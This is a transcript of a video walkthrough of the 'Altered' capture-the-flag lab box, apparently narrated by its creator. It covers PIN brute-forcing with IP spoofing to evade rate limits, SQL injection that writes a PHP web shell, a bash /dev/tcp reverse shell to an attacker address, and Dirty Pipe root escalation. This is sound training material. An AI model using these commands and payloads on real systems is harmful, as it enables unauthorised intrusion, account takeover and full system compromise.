 what's going on youtube this is ipsec i'm joined altered from the uhc march finals the box is a laravel web app that has a few vulnerabilities it starts off with just a simple multi-factor authentication brute force actually it's a password um reset brute force where the application gives you a four digit pin but doesn't invalidate the pin code upon a few invalid attempts instead it depends on ip address to handle rate limiting so if you can spoof your ip which in this case we can use the exported four header to spoof the ip we can bypass that rate limit and brute force the pin code once you get authenticated you can do an sql injection but it has a secure parameter trying to prevent unexpected data from getting the servers but you can use type juggling to force that secure parameter to true and do sql injection to write a shell to the web server which is vulnerable to dirty pipe but if you try to run su there's a fun surprise in for you so with that being said let's get into the box as always we start with the nmap so dash sc for default scripts sv enumerate versions oh a i'll put all formats bring the nmap directory and call it altered and then the ip address of 1010 11.159 this can take some time to run so i've already ran it looking at the results we have just two ports open the first one being ssh on port 22 and its banner tells us it's an ubuntu server we also have http on port 80. it's banner tells us it's running engine x but also on ubuntu we have the http title of the uhc march finals and there's not really that much other information so let's go take a look at the actual web page so i'm gonna go to 101011 159 and we just have a uhc player dashboard we can enter names of players um maybe i was playing so i put ipsack in the password of password and we get invalid username and we also get forget password so because it's saying invalid username we can potentially enumerate valid users we could go to like the uhc webpage and find previously qualified players for their tournament like salesian so if i did like selesion and password we see invalid password so this is a pretty good finding of um a way to enumerate usernames now for the hack the box edition of this i did allow admin so i think admin is here so invalid password but when this box was played live on uhc admin was not an account but hack the box people don't know previous uhc players so that's why i put admin in and we get this thing it says please enter the pin code emailed to you and it gives us a hint that the pin code is going to be four digits long so i'm going to try 9001 and it says invalid pin code but also tells us to be sure to use the same browser you requested from so generally this error message is because there's something about a browser that the web server ties to the pin code so i start out by going into like my storage tab i can look at cookies and the cookies tells me this is indeed a larval application so i know it's php uh we got cross-site request forgery i think there's also like local storage that things could hide in but most likely it's gonna be cookie but i still check things like local storage now i'm looking at this cookie and let's go to cyber chef real quick because the cookie itself looked like a big base64 string right so if i put this as the input we see that's definitely looking like base64 i see a percent 3d that is equals in url including so the first thing we do is like from url or maybe just type url decode and there we go we have decoded that and now we want to decode base64 so from base64 we get an iv [Music] so this is initialization vector and then a value here so if i now paste this we just get a blob and because it has initialization vector beforehand i'm going to assume this is something oh wait uh we have all this um mac this is like some type of signing in crypto so based upon having an iv and a mac field i'm gonna guess laurel encrypts the data in the cookie so this could be like my actual session what's in it i'm not positive but based upon having an iv and a mac i'm going to move on and just try to brute force this thing so if i let's see go back to the web page we want to intercept a request so i'm going to send it to burp suite we'll do one two three four and in here we have it and we could send this over to like intruder and brute force it this way but i have the free version of burp suite and intruder is not great on free i do notice this is a post request to slash api reset token and if we know from a previous laravel videos when it says api it's going to the api middleware which uh maybe is vulnerable to type uh juggling so let's try that real quick if i look at this the bytes is 6437 i'm going to look for the content type field so i can change it from url encoded to just json and then we can try name is equal to admin and what was the other one pen we got put this in quotes to be true so now we're doing some type juggling and we'll see if this works six four three seven it's the same exact thing i'm gonna guess this is the same response that we got before and this isn't vulnerable to type juggling so let's revert a request back to the default and try to just brute force this so we want to guess all numbers between zero and nine nine nine nine or quad nines um i'm gonna be lazy when i do this because i don't wanna format like one to be zero zero zero one uh probably don't have to do that honestly because in the php code let's see um well i guess it depends how it's treating this if it's treating pen as a string so if we did like if zero zero zero one is equal to one echo success let's see what happens here um see triple equals we know it's doing that and um it's not echoing success if we just did it one i think it's converting both of these to integers because it's not a strict type i'm not exactly sure why i did not expect that to happen but i'm guessing it's doing some type of thing to juggle it back to an integer and then there's an equal because 0 1 is the same thing as 1. if we got rid of the quotes and data triple equals it still says success so in php whenever you do comparisons definitely definitely pay attention to the number of equals because chances are you want three um it is kind of funny like i do three equals with quotes around 001 and one and it doesn't echo success i don't put those quotes and it does and the whole reason to this is it's converting these to an integer for me and um with the three equals it tells php hey treat the value as it was given it was given as string do not convert it to integer whereas here i do have the three equals but i specified integers so these are still technically the same value because we gave it in integer form by not putting the quotes so hopefully that makes sense um but we want to juggle the pin i'm going to be lazy and do 1000 to 9999 um so w fuzz dash h we're gonna give the um header for the cookie because it says pay attention to the browser so we will so we paste a cookie in and then the next thing we want is another header because in wfaz you always want when you do a post you always want to send the content type if you don't you get weird error messages that you may miss so i always get in the habit of sending content type i don't know if it's required but the case is when is required and you don't it'll mess you up so always do it better safe than sorry right the url was api slash reset token okay and then dash d for data this is going to be the data in the post request we can do name is equal to admin and pin is equal to fuzz so we kick this off and we have bad data oh um we need to specify what we want to fuzz right we didn't give it a word list i'm going to do dash z range and then 1000 to quad9 and what we wanted to do oh i noticed something weird we had this 140 character response then we had a 36 character response and a bunch of 36 character responses after that if i go back we're still at 36 i send this refresh and we're getting an error message now uh we have 429 too many requests so we got rate limited by laravel if we submit this without burp suite we may actually see the page come on come back to me api reset method not allowed too many requests this is what the error message looks like so if we google like bypass rate limit i'm going to add hack tricks to it actually let's see rate limit bypass and it talks about a bunch of origin headers and the reason why this works is because we have larval and we have engine x and larval is probably configured to allow engine x to be a proxy and when that's the case it's going to allow engine x the ability to overwrite ip addresses in actual headers so in the larval application um the ip address it sees is going to be the one engine specifies and if we tell engine x that we're a different ip then laravel is going to get a different ip and we'll bypass the rate limit so um let's make sure we're rate limited again doesn't look like we are i'm going to spin this up so we do get rate limited we can say x forwarded 4 127 0 0 i'm going to say 3. i send this request and we don't get that error message it's 200 okay if i take this out it's 429 put this back in 200 okay so we have a way to bypass the way laravel is doing its rate limiting so we just have to configure this and w fuzz and it's actually not super easy or actually it is easy it's just not intuitive let's see if i can do w fuzz documentation let's see if we have something read the docs there's a dash m flag and i was trying to pull it up exactly all the modes see zip is there a mode thing scan mode oh come on where is it wfuzz http verbs so i'm just going to try to explain it i don't know all the modes i know there is a zip mode and we're going to give it two different lists we're going to give it the range which we have here and we're also going to give it a word list of random numbers and the numbers are just going to be the last octet of the ip and the reason why we're doing that is so we can completely change the ip um each request and then the mode the stash mzip is just going to tell wfuzz how to use each word list in the zip mode is going to say use it um the word like this range is going to be the fuzz one parameter and then the next thing i'm going to put is going to be fuzz 2 parameter it says use each of these sequentially and keep going down the list there are different modes to do it like you could say um combine the two word lists so it says go through all of this word list and go through all the second and put those in both the responses um most often when you do two word lists you're going to want to use zip so maybe i'll make more sense once we do it and what we have to do is create numbers and if we just do a range we'll try this again real quick z range and we're gonna say one through is it range yeah one through two fifty four right so now we have ips one through two fifty four that sounds good we add the header let's go over to burp suite and let's see exported four copy paste and we do fuz2z and that's going to be the second parameter so when i run this we see everything right like here's the first parameter we sent the pin code here's the second one the ip address but because we did zip it just stops whenever the first word list is exhausted in this one the second word list gets exhausted after 253 so it stops so what i'm going to do is for i n sec 1 through 254 do echo i done so we just have a loop i'm going to write this to numbers and i'm going to write to numbers again and we want to write it to numbers how many times uh 1270 we want this to be as close to 999 as possible so we'll just do it a bunch more times see what we're at three thousand i probably should have done some mental math to um do this but i'm lazy as you know there we go i'm just going to keep going up until i have enough numbers to exhaust the whole pin code space i probably stopped at 9000 because i'm only doing 1000 to whatever so there's a one in 10 chance that i don't get a pin code but if i don't get a pin code i just run it again right it's not a big deal so now i change this range parameter we're going to do dash w numbers and now we just want to hide the invalid attempts and all the things are five six four four characters so i'll do dash dash h i think hh to hide characters five six four four and here we go everything's hidden we're going through the list when it hits 254 it comes back and if we get a rate limit thing it will come back as well and tell us we are rate limited so this process can probably take one to three minutes and if it doesn't come back maybe a pin code was under one thousand but um a little hint i coded this application and i was too lazy to look up how to format numbers under 1000 to be four digits so i just went ahead and um on the back end server card made it one thousand two nine nine nine nine so i know this is gonna hit as long as i did everything up here correct um if it doesn't i will probably delete my cookies and get a new cookie because my larval session could have got invalidated for whatever reason so maybe that's it but um yeah i'm just going to wait for this to finish and here we go we have a hit right now it is still a 200 so i don't think this is a rate limit and of course we're not getting a lot more rate limit so obviously not we have 7815 and this dash 212 is just remember it's that second word list we used the 12700212 ip address was it so let's copy 7815 we can kill our w fuzz go back here uh we can probably click back so we're back at this pin code 7815 submit and it's asking us to change the password so i'm going to put the password as please subscribe we'll log into the application so admin please subscribe and we get in so here we have a uhc player dashboard and if we click on the profile for view we can find information about all the players so nothing really too interesting here uh we can see the admin is this account was created for the hdb version of the box but i'm gonna go over to burp suite and we're going to intercept this and see what this request looks like so we have a get request it's going to api get profile id equals four and it has a secret parameter i don't know what that is but if i changed id let's do id equals three we get tampered user input detected so if i go back to this we can look at the bottom oh this is all in javascript i guess because the links don't show anything but if i intercept a different one i can see the secret stays the same so secrets eight nine cb on id equals one we for that we refresh the page let's intercept this again the secret still is the same exact thing for id1 it begins with 89cb if i go to the next one we have 2 and it's c516 so this looks like an md5sum and i say md5sum because i can kind of eyeball this length and that looks like 32 characters um we can validate that but that looks certainly an md5 sum so the server on the back end is building all these um user parameter fields and also md5 summing probably the id along with some type of secret and giving that to the user so the user doesn't know how the server generates the secret and since the user doesn't know they can't tamper any input so it's a way to allow dynamic input but lock it down to only what the service expects because if i put a single quote here we have tampered input detected so we could try things like a hash length extension attack against this but i mean again it's going to this api endpoint so i always always always like doing type juggling when i see it going to an api so we can say content type is equal to application json and then bring this data put it in the body of the request and if you go to my ransom video we also did a type juggling attack here it was also a uhc box it was the uhc qualifiers and that's something i like doing is i make the qualifier box have a technique that's also in the finals box because all the players should be familiar with this technique by now so we see i converted to json it works if i change it to five tampered user input i'm going to do type juggling here and just say secret is true and boom this works now we can do tamper user input right so the first thing i'm going to do add a semicolon a single quote we get server error this is looking good i do a comment it's still um being bad if i did this we have um it erred because the id field uh didn't exist because we have bad code right here so that's why i escaped this one double quote but we keep getting server error if i don't do a quote and just do a comment it seems to work right if i didn't do a comment i take one of these dashes out it gets server error so now i know this is probably sql injectable and the actual backend code is not using a quotation mark so let's just try union select one and we can put a comment on the n for good measure server here two three boom we have now union injection working i'm going to change this to id is equal to 100 something that's not in the database because if it's not in the database it's going to use the parameter from over here and we have three so if i put anything here if i do ipsec i probably should put that in single quotes we can write data so at this point we want to extract things from the information schema table to understand the database structure and we've probably done this a hundred times but just in case um you're into issues like me often i always google information schema my sequel doc dock just google this go to the first result if you go to the general tables you can see all the tables in this the first one you want is the schemata table and it has all the information you need so in this one we're going to do schema name because this is going to be the database name so we can get rid of this and i'm going to do a group concat and what group and cat is doing is taking multiple rows and converting it into one line because the output is expecting one line so we have to give it one line if we give it multiple it won't work we can try it without it real quick let me just put this my clipboard schema uh name i said line from information schema dot schemata like this uh we only get one so we could probably limit it and try to get multiple like limit one let me get my sequel one one information schema one is it two one so we can go like this and get each of the tables out what this is doing is saying limit it to one result starting at row number what and i hate doing multiple queries when we could just convert it into all those rows into just one and now we have all the databases just on one line so we want the uhc database so at this point i want to grab information out of this and i want to get the table names and column names and so i'm going for two columns out of a table or two definitions i guess we need the concat line as well because um we're combining multiple things that are on one row into just one thing if i didn't do it it would look something like this i'd have to do table name from information schema dot let's see is it columns where table schema is equal to uhc like that does this work and we have a list of all the tables and then we could get a list of columns as well but we don't have those associated with the table so i do the concat to be able to put multiple fields on one line so concat table name and then we're going to separate it with a colon we can do column name like that uh we have to do it under parentheses and now we have everything um here so fail jobs connection fail jobs exception it's not really pretty because it put them all on one line so we can break that by just starting the line with a line break and here we go we have a list of everything so this is all just larval stuff we have password reset this is an interesting uh tasks this is just from an old project because all my larvae boxes just started from the same thing i probably should have cleaned this out but i didn't uh we probably want users so we can do user name and user password so we replace table name with um let's see we want this to be name and this to be password and then from we can do uhc because we're not in the information schema table anymore uh dot users and we can get rid of this where statement and now we have a list of users and hashes so if we wanted to we could try cracking each of these passwords but that is not where this vulnerability is um what we have to do is drop a file on this so i was just showing like the sql injection because this is about i would go but we end up getting no interesting information out of the database so the next thing is we want to see if we can drop a web shell on this server now since it's a larval application it's not just going to be in verb www.html um we have to find out exactly where it is it is running engine x so we can try the default engine x location so let's see is it load file let's just try etsy passwd to make sure we can read files there we go um i think that's because i didn't revert the box let me revert the box and get this to a clean state because uh we shouldn't see that there yet so okay so i revered the box and um i was going to edit this out but this actually showed me something really cool like earlier i was like i don't know exactly what's in this larval session cookie right i assumed it was some type of crypto included in my session information but i've confirmed that because i reverted the box i didn't log back in this is the same exact cookie we had before so because of that i now know that this larval cookie contains information that um like about my session is just encrypted so if we got all the larval secrets out of this application we could just forge our own cookies it's not like in the database so how like a typical php application works is the php underscore session variable uh maps to a directory it's normally like ver temp and it's a file and the php session is just an md5 sum so when the server gets it it looks at the uh md the php session that you provided it it goes the file and gets all the data out of it but right here um this cookie didn't exist yet because i reverted the box and somehow it still treats me as logged in so one of two things happened either this endpoint is unsecure and i have a vulnerability in the application that i didn't know that allows unauthenticated people to execute it if they aren't authenticated and that's it so a second vulnerability we have um i wonder if someone could crawl this and just get it let's see real quick um sorry for this like segway but this is like how my mind goes when i start creating new things so i was wrong with that larval thing probably because this api endpoint doesn't require authentication my bad sloppy code by me oh id and secret field is required so you probably didn't even need to um like do the whole password reset thing you could probably skip to this thing if you figured out get profile so the next thing i would be doing here is i'd be going to opsec list right and then i would just grep dash r capital forget profile and see if it exists in a word list right i probably want to do a dollar and a carrot so that starts with get profile it ends uh starts and ends so if this exists in a word list there was a big flaw in my application but maybe we should look at that after the video let's get back into this while that grep runs or get profile doesn't exist so chances are no one would find this endpoint but interesting unintended anyways we want to get the engine x config so etsy engine x sites dash enabled default is i think the default location for the config it is so we see root is in serv altered public right so i'm going to do um a into out file so let's say ipsec just hit enter here server error we want to put a single quote ipsec into outfile and we'll write it to please subscribe dot html see if we can write this file we get a server error but when you write things into a file it's not going to return a row and since it didn't return a row we may get an error message but it may have still wrote so we should still test if that file exists it does we get one two ipsec so now we can probably write a shell so let's try um php and then request um cmd like this i want to say that will work before we do this whole into out file thing let's just make sure it echoes what we expect so this would be written in the file that looks good to me so let's write it and we want to put this into a php file so i'm going to do please subscribe dot php we get server error but if we do this we just get one two if i say question mark cmd is equal to id uh didn't work right that's weird um ls so that's not working do we have an error somewhere php we want to do system [Laughter] we gotta tell it to execute command first right um if i just try to write this i don't think it's gonna overwrite the file so we have to create a new name so um i'll call it sillymistake.php and let's try this and i'm still getting a message so let's see php system request cmd into out file um i don't do a dollar sign there and this will be ipsec can't code there we go third time's the charm if this doesn't work then i should stir up a php session locally and test my scripts but here we go we have it working no one gets it right the first time don't feel bad if you make mistakes because that's why we're doing this in hack the box so we learn from our mistakes and learn the best way to do it so uh happens to everyone let's go to brook suite refresh the page send it into repeater and i'm going to change the request method and we want to send me a reverse shell so bash c bash dash i dev tcp 10 10 14 8 port 9001 0 and 1 like that and we can url encode this for good measure and see lvnp let's run a new pane 9001 send it and we get a shell so i'm going to do a python 3 dash c input pty pty dot spawn bin bash okay that looks good sdty raw minus echo fg enter enter and whenever you do sdty raw minus echo you should put fg on the same line it's habit i don't but i should be doing that export term is equal to x term so now i can clear the screen and whenever i get a shell i like to go back and just make sure i did not hang the web server right i'm going to copy this it again make sure we get some uh input or output that we haven't got so we know it's not just cached we can see the web server still works so we're not causing an outage every now and then when you do a reverse shell on an application you may like hang the web server and the whole web server is not responding so as you're typing away in your shell like anyone that's trying to use the application can't and they get frustrated and you get caught so always good to double check and make sure the application still works after you get your shell anyways for this private i'm gonna do a little bit of hand waving magic stuff and say when you do you name and you see the kernel um you should be able to know if it's exploitable or not in this case um let's see we google dirty pipe exploit and go here let's see when this is um the cves and 2022 and it says kernel since 5 8 i'm looking at this i see 20 20 this is the build date of the kernel um january 10th so this kernel was built on january 10th when did dirty pipe come out um [Music] let's see where is the date um dirty pipe probably around march 10th so the kernel built in january 10th is probably going to be vulnerable to a colonel private a few months later right so we're just going to try dirty pipe out if i take this exploit that's on this page i don't exactly like the exploit because it can lead to a lot of mistakes but we'll show it real quick so do i have gcc on this box i probably don't because i mean it did not include that but let's make a directory d pipe and then go in here uh v d pipe dot c we can paste it and do gcc d pipe dot c out i'm gonna call this um original this would be the original exploit python three dash m http.server and we can just go dev shm and download and execute so 1010 14 8 8 000 slash for ridge and this is dirty pipe and if we execute it it wants the target file the offset and the data so the dirty pipe vulnerability requires us to be able to read the file a lot of exploits are using etsy passwd because everyone can read that the offset if i just do one actually let's do head dash one etsy passwd first so i can do original etsy passwd offset of one data i'm going to do a capital o right it says it worked i do a head on that's e-passwd and i see i overwrote the um second character in this the dirty pipe actually can't overwrite the very first character um it can only write after the first byte so let's restore this file so we don't like break the box so if i had desk 1 this is restored so the i think it was 1992 that the shadow file came about and before that passwords are stored right here where this x is this is user password uid group id i don't know what this one is i think this is group maybe home directory and shell so uh before 1992 before shadow people put the password hashes here because this is a time like before security and um passwords like brute forcing things wasn't a big thing i guess so being able to read the password hash be like well people can't reverse this hash it's fine anyone can read it and then someone came up well i can just like crack this password hash and get the password that became a big deal so someone created shadow and then moved the private and pieces of information to accounts into the shadow file and that was around 1992 i believe but um we can still put something in this spot a password and have it authenticate so let's test that out i'm gonna do dirty pipe exploit i'm gonna google aaron because i know um the main poc that makes this super easy uh puts the password as aaron so let's copy this exploit and do it right um see if i go cd d pipe v d pipe 2 dot c we're going to gcc d pipe 2 dot c i'm going to call this one aaron because that's what it's writing the password to and we can w get it where's my w get there we go aaron chmod plus x aaron so i try to execute this uh it says it set the root password and then system function failed if i do a head i can see root has this password set so let's try and s u to figure out why this thing um broke because the password should be aaron they put the um this is md5 crypt an md5 this is the salt you can put the salt to anything you want uh he put the salt to his name as well i just realized that i do su and what the heck just happened i'm in a game of wordle um there's a pam wordle module installed on su just as a fun thing um this box was created for uhc so people are hacking this box live and i just thought this would be a really fun troll there's a way around this but if you wanted to there's a functioning game of wordle which you have to guess um h a c k five character words so if we do a word that doesn't exist um false uh we get unknown word right so we have to guess words and i replace the dictionary with this to be hacker words so i'm gonna do hacks um we know the third character in this is c so um i don't really know of other things i hate being put on the spot to do this um this is a bad one i'm just doing a linux syscall wouldn't be a good guess because i know this field is c but um i don't know anything off top of my head that would be c f stat we know there's a t in this so one of these fields is t um let's see is crack one of the words unknown word that'd been a good one to add um shell so it ends in l has a c in the middle and also has a t so i have really no idea let's just get what the word was right uh f stat the word was i o ctl uh syscall if we put the password of aaron in now um it's gonna fail because we did not successfully play a wordle game so this was an annoying thing i had done but um yeah so we know there's an eye in a thing but really no idea this one was clone so i'm really bad at wordle so there's ways around this right we can write over any file so if we write over a set uid file we don't have to um play this game of wordle because it's a pam module it's being done on the su call we can't do like the pseudoers files because we can't read um was it etsy studios like whoops if i do a ls la on this file come on ipsec learn how to type only root can read this so we can't really modify this file but we can modify set uid binaries so by google dirty pipe set uid maybe exploit two where is it i know there is one um github is there one here exploit two dot c i want to say this one is the set uid so it's going to drop a elf file that's going to open temp sh and it's going to write the code to it and then chmod it and then return the file so i think that's what it's doing so let's try this out and then we'll cheat and play wordle because that'd be a fun way to wrap the video uh v d pipe3.c gcc we'll call this one set uid d pipe and then w get it set uid dash d pipe sage mod plus x on this dot slash set uid pipe uh it wants us to put the suit file we want to overwrite um fine slash dash perm is it minus 4000 to do this like this uh let's see let's overwrite what thing do we want to overwrite um we'll overwrite pk exec i'm laughing because there was a recent vulnerability in pk exec we do this and boom we are now root um so yeah it says don't forget to clean up temp sh because that's a reverse shell we could now go into root cat words let's copy all these words to a text file and cheat to play your game we can exit this pipe i'm going to exit out of my shell v words paste it in and now let's play wordle so let's get a word out of here uh opsec so we know it has an s and a c so let's see i wonder if i can do graph oh we don't know where it is so i'm just going to grab for s out of words and also grep for c and then we can do a grep v and say we don't want o we don't want p and we don't want e so there's three words this could now be um hex and that is correct that was the word i'm gonna do the password of an incorrect password so i didn't type aaron there and we have a failure so let's play it again real quick let's try hax again um it has an s so it doesn't have h a c okay but it has an s there we go so let's see let's try worms man i am getting good at i guess aaron and we get in so that was the other way you could do it if you actually played wordle um i made that intentionally heard if you don't have the word list let's see let's drop an ssh key here so makeder.ssh it already exists let's do an ssh keygen because i want to look at the code around um my get whatever so dash f root the get profile code because it's not accepting authentication and i honestly thought i put authentication there so let's copy this so echo is that gonna echo still two authorized keys okay i probably should have done two brackets but oh well ssh dash i root root at 10 10 11 dot what is the ip address this box 159 yes awesome we're in so let's just scp the app to us so scp root it was an srv altered here dash r we want to be recursive so we download the directory um what oh that's where the key is there we go so now i'm going to download the application and we will open in codium i probably should have zipped that up because that's going to take a while let's do a tar cjvf um we'll call it app.tar.bz2 and then we'll say it's an srv altered there we go app.tar.bz2 and this should copy almost instantly uh i'm in ssh there we go come on copy so there we go much quicker because we're not doing all that extra overhead of um downloading each file so x see jvf is that right awesome i love when i get the tarot syntax the correct time uh correct first time so i'm gonna do up open let's see this is um what is the box altered what hdb altered where am i oh i'm just in altered not htv home altered srv here we go so now i have all the larval source code so let's see if i go to routes i go to api we just have auth controller i'm guessing i probably should have put a user thing here honestly i'm trying to remember how to make an api endpoint authentication required if i go to get profile let's see that would be in not public resources no app http controllers this is the auth controller get profile i think i need to put a user here to require let's see name custom login let's say by google laravel api endpoint require authentication this should be it api authentication generating tokens hashing protecting routes function request let's see ah here it is um well that zoom feature did not work there but in this before the actual route it's saying the auth api and then here's the user endpoint so if i wanted to i would have to go to let's see this api and this would be something like let's see if i paste this we do route middleware auth api post and then something like this right i'm not sure if that is correct because we'll also probably have to create a token somehow right because i don't think that's gonna work because we also have to give it uh like jwt token i think this is um let's just see if this magically fixes it i don't think it will but we can try if it doesn't then oh well maybe if there's enough people that want it i'll do a live stream of fixing this application but let's try serve altered now let's just ssh get a proper shell right uh we have to go d pipe like that okay um bash serve altered we want to go into public not public routes v api like that um we don't want reset token though we want it to be get profile so copy this like that i don't know what all sanctum is i need to look that up as well so did i just do it again i did it again how stupid am i right there uh we want to do it on get profile there we go so let's see if we just crash our application now when i write this so we go back into repeater and i do this we get server error of course we do three it's still writing i don't have a cookie save it so this did not enforce um authentication so honestly i don't know exactly how um is the answer shoot well i hate sometimes when i do these um [Music] things and don't know but honestly that's why i create these boxes so i can figure these things out um let me try one last thing uh php artisan cache is it routes route is it route cache maybe it was that that was breaking it ha that looks better server error now um so level does have this route caching thing so i had to clear the route cache after editing the file um let's see api okay we can try um with the cookie again we probably have to brute force this and get a new cookie because i don't have a cookie in my repeater window we can try setting this i don't know if this is a good one or not still server error i'm going to try real quick let's redo a w fuzz and see if it works um a major if because i'm guessing we have to code something to be able to give us a jwt token i don't think it's just magically going to give it to us but who knows so let's try admin password invalid uh forgot admin one two three four invalid pin code so what i'm gonna do that i have a shell on the server instead of brute forcing it i'm gonna check if it's in let's see storage is it framework sessions here's where larval stores cookies and i'm gonna get let's see if i can do the first few characters eyj no um let's see let's go back to cyber chef come on paste let's see we want to url decode this first then we want to base64 decode from base of base64 there we go maybe the session is f9 it starts with i don't know um let's just choose the latest file um april 1st by cat z y see token we want pin so i'm going to grab pen for everything let's see do we have a valid pin in this session reset flash i'm looking for four digits right um grep 0 through 9 4 so it highlights it that's weird 4321 invalid pin code let's clear our cookies and redo this real quick 159 log in with a bad thing forgot admin does anything highlight no maybe i did some weird hashing on the pin which means i can't do this um [Music] i was saying i'd just be able to pull the pin out of the source code but i can see pen is a string and 32 characters i know what i did um on the server i'm hashing um username and then md5sum so i can't just pull it from this let's do that w fuzz again real quick um [Music] i'm starting to annoy myself with how i go to this application we'll look at the code after i delete all of this and i can show you exactly what happened in that session um curious if anyone's actually watching through to this point but man that is a long header i need to remove i should have did this a different way oh well i'm almost there come on delete the rest of this here we go so we can let's go to the network tab one uh we have a reset here let's just do it again reset edit let's grab the cookies name here we go paste that's not it let's do the other paste that looks better i'm probably not gonna be in a directory where numbers is um let's see altered there we go now we go a fuzzing so if i go to let's see this reset token endpoint so this is in aus controller reset token and we have md5 pen and username so this was my way of hacking up something so you couldn't like reset selesian's account and then replay his token on the admin user because in the back end the name is required and i put the name when you do the initial reset into your session so even though you're passing a name to the pin code it's pulling it from session when it validates so you can't reset other users passwords probably a horrible way to go about this the other thing i found interesting when i was creating this application let's see uh custom login depending on task controller reset token where is it it's probably get profile right so the reason this is sql injectable is because of this one where raw so if you're doing a um static code analysis against larval you may want to look for any db query that has raw in it because that's allowing them to do a raw sql query which enables that sql injection typically speaking you have to go out of your way to do this but i have seen sql injections and larval before and it always comes to developers for one reason or the other using this where raw thing so and this thing i mean most people here sql injection use parameterized statements and things when this one it's just like your framework does allow you to do dangerous things make sure you know when you're doing a dangerous thing and try not to do it in the dangerous way right um i'm just waiting on wfuzz now so um i'm gonna pause the video and we'll just let this finish and there we have it we have the pin code eight seven seven three so let's go back here type it uh change the password with the password to password log in with admin password and see if i broke this and i did um we're not giving it a jwt token in this so all of my queries to the profile of broken cell um i honestly don't know how to put the authentication on the api endpoint um i think i did it in a box before but again it's just highlighting like this is why i create boxes to actually learn these frameworks so i can figure out ways around them um so hope you guys enjoyed this video take care and i will see you all next time